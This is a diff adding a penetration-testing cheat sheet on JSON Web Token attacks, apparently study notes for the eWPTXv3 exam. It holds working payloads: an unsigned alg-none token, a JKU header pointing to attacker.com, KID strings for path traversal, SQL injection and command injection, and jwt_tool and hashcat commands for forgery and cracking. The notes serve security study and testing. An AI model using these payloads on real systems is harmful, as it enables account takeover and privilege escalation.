@@ -1,0 +1,179 @@
+# JWT Attacks
+
+> JSON Web Tokens (JWT) are used for authentication. Misconfigurations lead to account takeover and privilege escalation.
+
+---
+
+## 🔍 JWT Structure
+
+```
+Header.Payload.Signature
+
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9   <- Header (base64)
+.eyJ1c2VyIjoiYWRtaW4ifQ                  <- Payload (base64)
+.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c  <- Signature
+```
+
+### Decode manually:
+```bash
+echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
+# {"alg":"HS256","typ":"JWT"}
+```
+
+---
+
+## 💥 Common JWT Attacks
+
+### 1. Algorithm None Attack
+```json
+// Change header to:
+{"alg":"none","typ":"JWT"}
+
+// Remove signature (keep trailing dot)
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
+```
+
+### 2. HS256 to RS256 Algorithm Confusion
+```
+// If server uses RS256, switch to HS256
+// Sign with public key as HMAC secret
+// Server verifies HS256 using public key = bypass!
+```
+
+### 3. Weak Secret Brute Force
+```bash
+# hashcat
+hashcat -a 0 -m 16500 jwt.txt wordlist.txt
+
+# john
+john --wordlist=wordlist.txt --format=HMAC-SHA256 jwt.txt
+
+# jwt-cracker
+jwt-cracker "eyJ..." -a abcdefghijklmnopqrstuvwxyz
+```
+
+### 4. JWK Header Injection
+```json
+// Inject your own public key in header
+{
+  "alg": "RS256",
+  "jwk": {
+    "kty": "RSA",
+    "e": "AQAB",
+    "n": "YOUR_PUBLIC_KEY_MODULUS"
+  }
+}
+// Sign with your private key = bypass!
+```
+
+### 5. JKU Header Injection
+```json
+// Point jku to your server hosting fake JWK
+{
+  "alg": "RS256",
+  "jku": "https://attacker.com/jwks.json"
+}
+```
+
+### 6. KID Header Injection
+```json
+// Path traversal
+{"kid": "../../dev/null"}
+
+// SQL injection
+{"kid": "' UNION SELECT 'attacker_secret' --"}
+
+// OS command injection
+{"kid": "/dev/null; echo attacker_secret"}
+```
+
+### 7. Expired Token Reuse
+```bash
+# Check if server validates exp claim
+# Try old expired tokens
+# Modify exp to future date (if no signature check)
+```
+
+---
+
+## 🛠️ Tools
+
+```bash
+# jwt_tool - Swiss army knife for JWT
+python3 jwt_tool.py TOKEN
+
+# Scan all vulnerabilities
+python3 jwt_tool.py TOKEN -M at
+
+# Algorithm none attack
+python3 jwt_tool.py TOKEN -X a
+
+# Brute force secret
+python3 jwt_tool.py TOKEN -C -d wordlist.txt
+
+# JWK injection
+python3 jwt_tool.py TOKEN -X i
+
+# Burp Suite JWT Editor extension
+# - Modify claims easily
+# - Generate RSA/EC keys
+# - Embedded JWK attack
+```
+
+---
+
+## 📋 JWT Testing Checklist
+
+- [ ] Decode and read JWT claims
+- [ ] Try `alg: none` attack
+- [ ] Brute force weak HMAC secret
+- [ ] Check for algorithm confusion (RS256 → HS256)
+- [ ] Test JWK injection in header
+- [ ] Test JKU/X5U injection pointing to attacker server
+- [ ] Test KID injection (path traversal, SQLi)
+- [ ] Check if `exp` claim is validated
+- [ ] Check if `iat` claim is validated
+- [ ] Try modifying `sub`, `role`, `user` claims
+- [ ] Test null signature
+
+---
+
+## 🧪 Payload Manipulation
+
+```python
+import base64
+import json
+
+# Decode payload
+payload = "eyJ1c2VyIjoiZ3Vlc3QifQ"
+decoded = base64.b64decode(payload + "==").decode()
+print(decoded)  # {"user":"guest"}
+
+# Modify and re-encode
+data = {"user": "admin", "role": "administrator"}
+new_payload = base64.b64encode(json.dumps(data).encode()).decode().rstrip("=")
+print(new_payload)
+```
+
+---
+
+## 🧠 eWPTXv3 Tips
+
+- **Always use jwt_tool** with `-M at` for full scan
+- Check `kid` parameter for **path traversal and SQLi**
+- Try **RS256 to HS256** if you can get the public key
+- Look for JWT in **cookies, Authorization header, URL params**
+- Test **refresh tokens** too — same vulnerabilities apply
+- **Burp JWT Editor** extension = must have
+
+---
+
+## 📚 References
+
+- [PortSwigger JWT Labs](https://portswigger.net/web-security/jwt)
+- [jwt_tool GitHub](https://github.com/ticarpi/jwt_tool)
+- [PayloadsAllTheThings JWT](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token)
+
+---
+
+*Notes by [@mtsboy01](https://github.com/mtsboy01) | MTS-SECURITY*
